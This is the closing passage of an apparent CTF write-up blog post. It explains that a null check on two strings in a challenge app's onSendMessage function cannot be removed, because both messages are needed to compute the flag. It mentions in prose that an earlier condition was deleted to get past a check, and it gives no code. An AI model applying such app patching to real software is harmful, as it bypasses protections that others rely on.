<p>The first condition checks if String q and s are not null. That is they have to be initialized and set to some specific value. We cannot delete this if condition like before because we need values of q and s to calculate the flag.</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*o-0u1INYr1chxf7yUPA-NQ.jpeg" alt="In function onSendMessage"><em>In function onSendMessage</em></p>
<p>It’s only after successfully sending both questions, the values for q and s are set. So it is necessary to send both messages.</p>
<p>So that’s my solution for this CTF. This was my first ever CTF and learned a lot during this challenge. Hope you also learned something.</p>
<p>Thanks for reading my write-up! Cheers! 🍺</p>
<p>Follow me on <a href="https://twitter.com/fake_batman_">Twitter</a>, <a href="https://github.com/harshitm98">Github</a> or connect on <a href="https://linkedin.com/in/harshitm98">LinkedIn</a>.</p>
]]></content>
        </item>
        
    </channel>
</rss>
